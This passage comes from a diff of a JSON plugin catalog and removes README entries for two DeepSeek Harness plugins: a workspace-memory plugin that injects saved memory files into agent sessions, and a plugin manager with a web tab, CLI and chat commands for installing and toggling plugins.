mode keeps memories in `<workspace>/.dsh/memory/` for teams who *want* them versioned alongside the code.)\n2. **Memories are injected automatically** — each session created in a workspace carries that workspace's memory files in its system prompt, alongside `AGENTS.md`, so a fresh session starts already \"remembering\".\n3. **The agent can write memories itself** — a global `save_workspace_memory` tool lets any session persist a decision, server detail, convention, or preference the moment you say \"remember this\".\n4. **You stay in control** — a sidebar panel lists, creates, edits, and deletes memory files per workspace, so memory stays inspectable and correctable instead of hidden in a database.\n\n## Features\n\n| Capability | Where |\n|---|---|\n| Browse / create / edit / delete memory files | **Workspace Memory** sidebar panel (switch workspaces via the selector) |\n| Ask the agent to remember something | Any session: \"remember: …\" → the agent calls `save_workspace_memory` |\n| Automatic recall | Every session in the workspace gets its memory files injected into its system prompt |\n\nWorks in every built-in agent preset (Standard, PTC, Minimal, Creator): the tool is registered in the root composition, and global tools are visible to all presets unless a custom preset opts out with a `tools.restrict` allow list — add `save_workspace_memory` to that list if so.\n\n## Installation\n\nThe package is plain JavaScript with no build step, so every install channel works:\n\n```sh\n# from npm (once published)\ndsh plugin --profile desktop add dsh-workspace-memories\n\n# straight from GitHub (no build script needed — sources ship as-is)\ndsh plugin --profile desktop add github:lengfengng1-ai-architect/dsh-workspace-memories\n\n# from a local checkout\ndsh plugin --profile desktop add ./dsh-workspace-memories\n```\n\nOr use the GUI: sidebar **Plugins → Add plugin**, paste a package name, GitHub address, or absolute local path, then **Enable now**.\n\nUninstall: the Plugins page, or `dsh plugin --profile desktop remove dsh-workspace-memories`.\n\n## Usage\n\n- Open the **Workspace Memory** entry in the sidebar. The selector defaults to the workspace of the current session. **New file** creates a `.md` memory (the extension is added when missing); select a file to edit, save, or delete it.\n- Tell the agent \"remember: this project uses pnpm, not npm\" — it writes a memory file that every session of the workspace (and the panel) sees immediately.\n- Storage and layout are configurable: `storage: home` (default, DSH data directory, outside the project) or `storage: workspace` (inside the project at `directory`, default `.dsh/memory`).\n\n## Important: start a new session after installing or upgrading\n\nTool registration takes effect immediately on the host, but **a model's visible tool list is assembled when each conversation turn starts**:\n\n- If a session's current turn began *before* the plugin was installed or reloaded, that turn's tool declaration is stale. This is most visible in **PTC mode**, where the model reads a pre-generated TypeScript binding (`ToolArgsMap`) that does not yet contain `save_workspace_memory` — the model may conclude \"there is no memory tool\", or fall back to probing the tool by name through the code channel (which actually works, since dispatch goes through the live host registry).\n- **The fix is simple: start a new session, or just send a new message after the current turn ends.** The next turn regenerates the tool declaration and `save_workspace_memory` appears normally — no probing needed.\n\nMemory injection into the system prompt is attached when an agent is created (session start, resume after a restart, clear, or compaction); once attached, a session picks up changed memory files on its next step automatically.\n\n## Data layout and safety\n\nTwo storage modes, chosen by the plugin's `storage` config:\n\n| Mode | Memory location | Use it for |\n|---|---|---|\n| `home` (default) | `~/.dsh/workspace-memory/<workspace-key>/` — outside the project | Machine-local or sensitive notes: server configs, environment quirks, personal conventions |\n| `workspace` | `<workspace>/.dsh/memory/` — inside the project | Team-shared memories meant to be committed alongside the code |\n\n```\n~/.dsh/workspace-memory/     # default memory store, one subdirectory per workspace\ndsh-workspace-memories/        # this plugin\n├── package.json             #   bundle manifest (dsh.bundle.patch + dsh.client)\n├── cordis.patch.yml         #   plugin row declaration\n├── index.js                 #   host: /api routes + prompt injection + the save tool\n├── client.js                #   browser: sidebar entry + management panel\n├── locale/                  #   panel copy (en, zh)\n├── icon.svg\n└── selftest.mjs             #   host-logic self-test: node selftest.mjs\n```\n\nSafety constraints: the browser panel can only address registered workspaces by `workspaceId` (no arbitrary host paths); file names are strictly validated (no path separators, `..`, whitespace, or control characters); one file is capped at 1 MiB; prompt injection truncates each file to 32K characters and caps at 20 files.\n\n## Development\n\n- Install with a `link:` dependency (local-path install does this): editing `client.js` hot-reloads in the page via the client HMR receiver; editing `index.js` (host code) requires a DSH restart to load the new module generation.\n- Run the self-test: `node selftest.mjs` (mocks the plugin context; covers routes, prompt rendering, tool writes, and validation failures).\n- Runtime checks: host entry `include:workspace-memory` should be `active`; the client slot `sidebar.panellist` should list a `workspace-memory` occupant; `save_workspace_memory` should appear in the tool list.\n\n## License\n\n[MIT](LICENSE) — © 2026 lengfengng1-ai-architect\n\n---\n\nThis is a community plugin built on [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness); it is not an official DeepSeek product. Naming follows the [DSH brand guidelines](https://github.com/deepseek-ai/deepseek-harness/blob/main/BRAND_GUIDELINES.md).\n"
-    },
-    {
-      "full_name": "OSSKn4w7/dsh-plugin-manager",
-      "html_url": "https://github.com/OSSKn4w7/dsh-plugin-manager",
-      "description": "Manage DeepSeek Harness (dsh) plugins from the web GUI, CLI, and /plugin chat command — install, enable/disable, uninstall without editing config files",
-      "stars": 1,
-      "language": "JavaScript",
-      "pushed_at": "2026-08-15T03:39:45Z",
-      "topics": [
-        "cordis",
-        "deepseek-harness",
-        "dsh-plugin",
-        "plugin-manager"
-      ],
-      "categories": [
-        "终端/TUI"
-      ],
-      "tags": [
-        "cordis",
-        "deepseek-harness",
-        "dsh-plugin",
-        "plugin-manager"
-      ],
-      "readme_text": "# dsh-plugin-manager\n\nManage DeepSeek Harness plugins **without editing config files**.\n\nThe shipped workflow is: drop a package into the profile, hand-edit\n`cordis.patch.yml`, restart, repeat. This plugin gives the web GUI a **插件管理\n(Manage) tab** — right inside **Settings → Plugins** — where you can:\n\n- **install** a plugin by npm package name (with optional JSON config),\n- **enable / disable** any loader entry with one click (applied **live**, no restart),\n- **uninstall** plugins again,\n- see the whole composed Loader tree, the profile's dependencies and bundles,\n  and which rows the manager itself installed.\n\nIt writes your profile's `cordis.patch.yml` for you (a delimited auto-managed\nblock; your hand-written patches are preserved byte-for-byte) and the running\nserver's user-patch watcher (HMR) applies the change immediately.\n\nIt also ships a CLI (`dsh-plugin-manager`) and a chat command (`/plugin`).\n\n## Components\n\n| Piece | Role |\n|---|---|\n| `lib/index.js` | Host half: JSON API under `/plugin-manager/api` + the `/plugin` chat command |\n| `lib/client.js` | Browser half: the 插件管理 tab in Settings → Plugins |\n| `lib/core.mjs` | Shared logic: managed-block editing of `cordis.patch.yml`, pnpm runner, bundle reconcile |\n| `bin/dsh-plugin-manager.mjs` | Standalone CLI (works even while the server is stopped) |\n\n## Install\n\nnpm: `@osskn4w7/dsh-plugin-manager`\n\n```sh\n# Option A — standard dsh bundle install:\ndsh plugin --profile web add @osskn4w7/dsh-plugin-manager\n# then restart dsh web (bundle patch layers load at boot)\n\n# Option B — live install without a restart (from this checkout):\ndsh-plugin-manager bootstrap --profile web\n# or by hand: pnpm add file:… in the profile dir, then enable the entry,\n# then refresh the browser (Settings → Plugins → 插件管理)\n```\n\nUse one option, not both (the row would be inserted twice). `bootstrap`\ninstalls this package into `$DSH_HOME/profiles/web` via pnpm and wires its\nLoader entry into `cordis.patch.yml`. Because the profile patch file is\nwatched live, the host half activates immediately; refresh the browser once\nso the client bundle is picked up.\n\nTo use the CLI standalone (outside a profile checkout):\n\n```sh\nnpm i -g @osskn4w7/dsh-plugin-manager\ndsh-plugin-manager list --profile web\n```\n\nRequirements: `pnpm` on PATH, the `web` profile (or any profile with the web\nbundle), and a loopback-bound server (the default).\n\n## Publishing (maintainers)\n\nThe package lives on npm as `@osskn4w7/dsh-plugin-manager` and on GitHub as\n[OSSKn4w7/dsh-plugin-manager](https://github.com/OSSKn4w7/dsh-plugin-manager).\n\n```sh\nnpm version patch          # or minor / major — bumps version + git tag\nnpm publish --registry=https://registry.npmjs.org/ --access public\ngit push && git push --tags\n```\n\nNotes:\n- The default npm registry on this machine is an npmmirror mirror — always\n  pass `--registry=https://registry.npmjs.org/` (mirrors are read-only).\n- The account has 2FA enabled (`auth-and-writes`): publish either with\n  `--otp <code>` or with a granular access token that has **bypass 2FA**\n  enabled (create it at npmjs.com settings; its direct-publish ability is\n  scheduled to end January 2027 in favor of a 2FA-approval flow).\n- The `bin` entry (`dsh-plugin-manager`) is included in the published tarball\n  via the package's `files` whitelist.\n\n## How enabling/disabling works\n\n- **Plain plugin** (no `dsh.bundle` in its manifest): `install` runs\n  `pnpm add` and inserts a live Loader entry into the managed block —\n  enabled immediately.\n- **Bundle plugin** (declares `dsh.bundle`): `install` runs `pnpm add` and\n  reconciles the name into `dsh.profile.bundles` in `package.json` (same rule\n  as `dsh plugin --profile … add`). Bundle patch layers are read at boot, so\n  it reports `needsRestart`; after restart its entries appear and can be\n  toggled.\n- **Enable/disable**: adds/removes an id-targeted `disabled` patch in the\n  managed block. The watcher recomposes the tree live.\n\n## CLI\n\n```sh\ndsh-plugin-manager list [--json] [--profile web]\ndsh-plugin-manager enable <entry-id>   # or: disable\ndsh-plugin-manager install <pkg> [--config '{\"a\":1}']\ndsh-plugin-manager remove <pkg>\ndsh-plugin-manager bootstrap\n```\n\n## Chat command\n\nIn the web chat, `/plugin list`, `/plugin enable <id>`, `/plugin disable <id>`,\n`/plugin install <pkg>`, `/plugin remove <pkg>`.\n\n## Notes\n\n- The managed block in `cordis.patch.yml` is delimited by\n  `# >>> dsh-plugin-manager … >>>` / `# <<< dsh-plugin-manager <<<`; edits\n  inside it are overwritten. Everything outside is yours.\n- The HTTP API is loopback-only (matching the server's default bind) and\n  carries no auth — do not expose the web server to a network you do not\n  trust.\n- A disabled row whose id no longer exists in the composed tree logs a benign\n  loader warning; the manager drops such patches for packages it uninstalls.\n\n## License\n\nMIT\n"
     }
   ]
 }
